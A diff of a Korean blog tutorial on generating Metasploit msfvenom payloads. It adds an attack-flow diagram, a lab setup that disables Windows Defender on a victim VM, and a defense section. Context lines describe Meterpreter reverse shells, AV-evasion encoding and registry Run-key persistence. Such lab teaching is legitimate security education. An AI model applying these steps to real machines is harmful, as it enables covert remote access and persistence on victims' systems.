@@ -13,7 +13,21 @@ categories: [hacking-tools]
 
 ---
 
-## 2. 주요 옵션
+## 2. 페이로드 생성 흐름
+
+```mermaid
+flowchart LR
+    A[타겟 OS 확인] --> B[페이로드 선택]
+    B --> C[MSFvenom 실행]
+    C --> D[악성 파일 생성]
+    D --> E[핸들러 설정]
+    E --> F[파일 전달/실행]
+    F --> G[Meterpreter 세션]
+```
+
+---
+
+## 3. 주요 옵션
 
 `msfvenom`은 명령줄에서 다양한 옵션을 조합하여 사용한다.
 
@@ -30,7 +44,22 @@ categories: [hacking-tools]
 
 ---
 
-## 3. 페이로드 생성 실습
+## 4. 실습 환경
+
+### Kali Linux (공격자)
+악성 페이로드를 생성하고 핸들러(Listener)를 실행하는 환경이다.
+```bash
+ifconfig eth0  # IP 확인 (LHOST 설정용)
+```
+
+### Windows 10/11 VM (피해자)
+생성된 실행 파일(`patch.exe`)을 복사하여 실행할 타겟 시스템이다.
+*   **주의**: Windows Defender 실시간 감시를 꺼야 실습 가능
+*   네트워크는 Host-Only 또는 NAT Network로 내부 통신만 가능하게 격리 권장
+
+---
+
+## 5. 페이로드 생성 실습 (기본)
 
 #### Windows용 악성 실행 파일
 64비트 Windows 환경에서 동작하는 Meterpreter 리버스 쉘을 생성한다. `x64/zutto_dekiru` 인코더를 사용하여 AV 탐지 우회 가능성을 높인다.
@@ -54,7 +83,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp \
 
 ---
 
-## 4. 리스너 설정 및 연결
+## 6. 리스너 설정 및 연결
 
 생성한 악성 파일이 대상 시스템에서 실행되면 공격자에게 연결을 시도한다. 이를 받기 위해 `msfconsole`에서 핸들러를 실행하고 기다려야 한다.
 
@@ -71,7 +100,7 @@ msf6 > run
 
 ---
 
-## 5. 지속성 유지
+## 7. 지속성 유지 (Persistence)
 
 Meterpreter 세션을 획득했더라도 대상 PC가 재부팅되면 연결이 끊어진다. 이를 방지하기 위해 레지스트리 Run 키에 백도어를 등록하여 부팅 시마다 자동으로 연결되도록 설정한다.
 
@@ -87,9 +116,15 @@ msf6 > run
 
 ---
 
-## 6. 탐지 및 대응
+## 8. 탐지 및 방어 대책
 
 이러한 악성 행위는 **Sysinternals Autoruns** 도구를 통해 탐지할 수 있다.
 `Logon` 탭을 확인하여 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 경로에 알 수 없는 VBS 스크립트나 실행 파일이 등록되어 있는지 주기적으로 점검해야 한다.
+
+### 방어 방법
+*   **Endpoint Protection (EDR)**: 시그니처 기반이 아닌 행위 기반(Heuristic) 탐지 솔루션을 도입하여 미터프리터 주입 행위를 차단한다.
+*   **PowerShell 제한**: 일반 사용자의 PowerShell 및 스크립트 실행 권한을 제한(Constrained Language Mode)한다.
+*   **Application Whitelisting**: AppLocker 등을 통해 서명되지 않았거나 허용되지 않은 경로의 실행 파일 실행을 원천 차단한다.
+*   **아웃바운드 통제**: 방화벽에서 알려지지 않은 외부 IP로의 불필요한 아웃바운드 연결을 차단한다.
 
 <hr class="short-rule">
